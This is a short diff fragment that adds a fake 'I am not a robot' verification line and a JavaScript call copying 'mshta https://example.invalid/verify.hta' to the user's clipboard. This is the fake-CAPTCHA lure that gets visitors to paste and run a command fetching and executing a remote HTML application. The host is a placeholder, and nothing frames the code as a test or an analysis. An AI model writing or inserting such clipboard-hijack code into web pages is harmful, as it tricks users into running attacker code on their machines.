@@ -1,0 +1,3 @@
+verification: I am not a robot
+navigator.clipboard.writeText('mshta https://example.invalid/verify.hta')
+
